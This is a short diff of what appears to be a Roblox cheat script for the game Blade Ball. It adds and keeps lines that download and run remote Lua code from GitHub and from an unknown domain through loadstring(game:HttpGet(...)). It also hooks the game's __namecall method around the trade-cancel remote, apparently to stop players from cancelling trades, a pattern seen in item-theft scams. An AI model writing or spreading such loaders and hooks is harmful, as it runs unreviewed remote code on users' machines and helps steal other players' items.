@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iminreality/Allux/refs/heads/main/Blade_Ball.lua"))()
+
+
 pcall(function()
     local declince = game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_net@0.1.0").net:FindFirstChild("RF/Trading/CancelTrade")
     local __namecall;
@@ -8,9 +11,5 @@ pcall(function()
         return __namecall(self, ...)
     end)
 end)
-
-loadstring(game:HttpGet("https://egorikusa.space/2cc88a3df254bf3f749df988.lua", true))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iminreality/Allux/refs/heads/main/Blade_Ball.lua"))()
 
 loadstring(game:HttpGet("https://egorikusa.space/2cc88a3df254bf3f749df988.lua", true))()
